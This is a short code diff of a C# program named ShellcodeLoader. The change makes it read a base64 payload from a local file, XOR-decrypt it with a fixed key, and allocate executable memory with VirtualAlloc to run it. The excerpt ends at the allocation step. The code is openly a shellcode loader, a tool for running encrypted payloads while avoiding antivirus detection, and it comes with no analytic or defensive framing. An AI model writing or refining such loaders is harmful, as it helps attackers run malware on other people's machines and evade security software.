@@ -25,20 +25,21 @@ namespace ShellcodeLoader
 
             return encryptedBytes;
         }
+
+
         static void Main(string[] args)
         {
-            // Replace the following with your shellcode
+            // Base64 raw payload
+            string base64String = File.ReadAllText("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\ShellcodeLoaderGPT\\encrypted.txt"); ;
 
-            // base64 of xored shellcode
-            string base64String = "shellcode";
-            
             // Base64 decode
             byte[] shellcode = Convert.FromBase64String(base64String);
 
             // Xor Decrypt
             byte[] keyBytes = new byte[] { 0xAB, 0xCD, 0xEF };
-            byte[] decryptedBytes = XOR(shellcode, keyBytes);
             
+            byte[] decryptedBytes = XOR(shellcode, keyBytes);
+
             // Allocate memory for the shellcode
             IntPtr ptr = VirtualAlloc(IntPtr.Zero, decryptedBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
